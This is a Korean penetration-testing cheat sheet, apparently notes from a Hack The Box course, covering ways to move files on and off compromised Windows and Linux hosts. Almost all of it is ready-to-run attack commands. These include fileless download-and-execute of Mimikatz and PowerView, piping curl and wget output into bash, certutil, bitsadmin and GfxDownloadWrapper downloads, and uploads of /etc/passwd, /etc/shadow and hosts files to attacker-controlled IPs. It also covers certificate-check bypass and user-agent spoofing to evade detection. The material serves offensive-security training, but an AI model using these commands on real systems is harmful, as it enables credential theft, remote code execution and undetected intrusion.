# 1.Download

## Windows

### PowerShell DownloadFile
```(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')```<br/>
예) ```(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')```<br/>
```(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')```<br/>
예) ```(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')```

### PowerShell DownloadString (File 없는 방법)
```IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')```<br/>
또는 ```(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX```

### PowerShell Invoke-WebRequest
```Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1```

### Internet Explorer의 첫번째 실행 구성 미완료 우회
```Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX```

### 인증서 신뢰 오류 우회
```
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
```

### SMB 서버 생성
```impacket-smbserver share -smb2support /tmp/smbshare```<br/>
```copy \\192.168.220.133\share\nc.exe```

사용자 인증 추가 - 비인증 경고 우회) <br/>
```impacket-smbserver share -smb2support /tmp/smbshare -user test -password test```<br/>
```
net use n: \\192.168.220.133\share /user:test test
copy n:\nc.exe
```

### FTP 서버 생성
```python3 -m pyftpdlib --port 21```<br/>
```(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')```

### Bitsadmin 사용 파일 다운로드
```bitsadmin /transfer wcb /priority foreground http://192.168.1.1:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe```<br/>
```Import-Module bitstransfer; Start-BitsTransfer -Source "http://192.168.1.1:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"```

### Certutil 사용 파일 다운로드
```certutil.exe -verifyctl -split -f http://192.168.1.1:8000/nc.exe```

<br/><br/>
## Linux

### wget 사용 파일 다운로드
```wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh```

### cURL 사용 파일 다운로드
```curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh```

### cURL 사용 파일 다운로드 (File 없는 방법)
```curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash```

### wget 사용 파일 다운로드 (File 없는 방법)
```wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3```

### Bash로 다운로드 (/dev/tcp)
```
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
```

### SSH(SCP) 사용 다운로드
```scp plaintext@192.168.49.128:/root/myroot.txt .```

<br/><br/>
## Code

### Python 2 - Download
```python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'```

### Python 3 - Download
```python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'```

### PHP Download - File_get_contents()
```php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'```

### PHP Download - Fopen()
```php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'```

### PHP Download (Pipe & Bash)
```php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash```

### ruby - Download
```ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'```

### perl - Download
```perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'```

<br/><br/>
# 2.Upload

## Windows

### PowerShell Web Upload
```python3 -m uploadserver```<br/>
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### PowerShell Base64 Upload
```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
```echo <base64> | base64 -d -w 0 > hosts```

### 업로드용 FTP 서버 생성
```python3 -m pyftpdlib --port 21 --write```<br/>
```(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')```

<br/><br/>
## Linux

### Web Upload(HTTPS)
```
python3 -m pip install --user uploadserver
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
mkdir https && cd https
python3 -m uploadserver 443 --server-certificate ~/server.pem
```
```curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure```

### Web Server 만들기
```python3 -m http.server```<br/>
```python2.7 -m SimpleHTTPServer```<br/>
```php -S 0.0.0.0:8000```<br/>
```ruby -run -ehttpd . -p8000```

### SSH(SCP) 사용 업로드
```scp /etc/passwd htb-student@192.168.1.1:/home/uplaod/```

<br/><br/>
## Code

### Python 3 Upload
```python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'```

<br/><br/>
# 3.File Transfer

## Netcat 

### nc로 수신 대기
```nc -l -p 8000 > SharpKatz.exe```

### nc로 파일 전송
```nc -q 0 192.168.49.128 8000 < SharpKatz.exe```

### nc로 전송 대기
```nc -l -p 443 -q 0 < SharpKatz.exe```

### nc로 파일 수신
```nc 192.168.49.128 443 > SharpKatz.exe```<br/>
nc가 없을 경우) ```cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe```
<br/><br/>
## PowerShell Session File Transfer

### PowerShell Session 설정
```
Test-NetConnection -ComputerName <hostname> -Port 5985
$Session = New-PSSession -ComputerName <hostname>
```

### 로컬 파일을 host로 복사
```Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\```

### host의 파일을 로컬로 복사
```Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session```
<br/><br/>
## RDP

### rdesktop으로 Linux 폴더 마운트
```rdesktop 192.168.1.1 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'```

### xfreerdp로 Linux 폴더 마운트
```xfreerdp /v:192.168.1.1 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer```

<br/><br/>
## Protected File Transfers

### Windows File Encryption
```
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

### Linux File Encryption/Decryption
```openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc```<br/>
```openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd```

<br/><br/>
## 탐지 우회

### Chrome User Agent로 다운로드
```
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://192.168.1.1/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

### Transferring File - GfxDownloadWrapper
```GfxDownloadWrapper.exe "http://192.168.1.1/mimikatz.exe" "C:\Temp\nc.exe"```
